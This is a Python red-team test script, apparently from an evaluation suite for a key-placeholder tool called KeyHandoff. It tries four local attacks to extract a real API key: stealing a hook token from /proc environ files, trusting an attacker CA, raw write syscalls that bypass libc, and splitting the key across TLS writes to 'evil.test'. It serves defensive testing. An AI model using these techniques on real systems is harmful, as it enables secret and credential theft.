# Attacks on placeholders from code running inside a program started by
# `keyhandoff run`, each trying to get the real key out. One mode per run:
#
#   environ    read the hook's token from /proc/self/environ (and a child's)
#              and ask KeyHandoff for the key with it
#   certfile   trust an attacker CA through SSL_CERT_FILE, then present a
#              certificate for the key's host signed by it
#   syscall    send the placeholder with a raw write(2) syscall, past libc
#   split      send the placeholder over TLS in two halves
#
# Prints what it got. Local only; see eval/replays/README.md.
import ctypes, json, os, socket, ssl, subprocess, sys
cfg = json.load(open("attack.json"))
mode = sys.argv[1]
key = os.environ["STRIPE_API_KEY"]

def tls(name, port, ca=None):
    ctx = ssl.create_default_context(cafile=ca) if ca else ssl.create_default_context()
    return ctx.wrap_socket(socket.create_connection(("127.0.0.1", port)), server_hostname=name)

if mode == "environ":
    blocks = [open("/proc/self/environ", "rb").read()]
    child = subprocess.Popen(["sleep", "1"])
    try:
        blocks.append(open("/proc/%d/environ" % child.pid, "rb").read())
    except OSError:
        pass
    child.wait()
    found = [v for b in blocks for v in b.split(b"\0") if v.startswith(b"KEYHANDOFF_HOOK=")]
    tokens = [v.split(b"=", 1)[1].decode(errors="replace") for v in found]
    tokens = [t for t in tokens if len(t) > 65 and all(c in "0123456789abcdef" for c in t[:64])]
    if not tokens:
        print("no token found")
    for t in tokens:
        token, path = t[:64], t[65:]
        c = socket.socket(socket.AF_UNIX)
        c.connect(path)
        c.sendall(json.dumps({"swap": {"token": token, "placeholder": key, "host": "api.stripe.test"}}).encode() + b"\n")
        print("asked with a stolen token:", c.recv(200).decode().strip()[:2])
elif mode == "certfile":
    # SSL_CERT_FILE is set by the command line to the attacker's certificate.
    try:
        with tls("api.stripe.test", cfg["ports"]["self:api.stripe.test"]) as s:
            s.sendall(("GET / HTTP/1.1\r\nHost: api.stripe.test\r\nAuthorization: Bearer %s\r\n\r\n" % key).encode())
            s.recv(10)
        print("sent")
    except OSError as e:
        print("refused", type(e).__name__)
elif mode == "syscall":
    s = socket.create_connection(("127.0.0.1", cfg["ports"]["plain"]))
    libc = ctypes.CDLL(None, use_errno=True)
    data = ("key=" + key + "\n").encode()
    n = libc.syscall(1, s.fileno(), data, len(data))  # SYS_write on x86-64
    print("raw write returned", n)
    s.close()
elif mode == "split":
    half = len(key) // 2
    try:
        with tls("evil.test", cfg["ports"]["evil.test"], cfg["ca"]) as s:
            s.sendall(("GET / HTTP/1.1\r\nHost: evil.test\r\nX-A: " + key[:half] + "\r\n").encode())
            s.sendall(("X-B: " + key[half:] + "\r\n\r\n").encode())
            s.recv(10)
        print("sent")
    except OSError as e:
        print("refused", type(e).__name__)
